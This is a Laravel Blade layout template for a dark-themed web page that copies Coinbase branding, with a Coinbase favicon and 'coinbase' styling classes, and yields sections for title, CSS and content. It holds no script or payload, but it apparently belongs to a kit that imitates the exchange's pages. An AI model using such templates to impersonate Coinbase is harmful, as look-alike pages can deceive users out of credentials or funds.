<!DOCTYPE html>
<html class="ll-fb" lang="en" style="background:#0a0b0d;">
<head>
<meta charset="utf-8"/>
<link rel="icon" href="/Coinbaselogo.png"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<title>@yield('title')</title>
<meta content="#000000" name="theme-color"/>
<style>{!! $familyCss !!}</style>
<style>@yield('pageCss')</style>
</head>
<body style="background:#0a0b0d;">
<div class="ll-fb-type" id="root">
<div class="h-full w-full flex-grow justify-between bg-coinbase-background sm:justify-start">
<div class="w-full px-6 pt-5">
{!! $logoSvg !!}
</div>
<div class="flex w-full flex-col items-center justify-center bg-coinbase-background pb-8">
@yield('content')
</div>
</div>
</div>
</body>
</html>
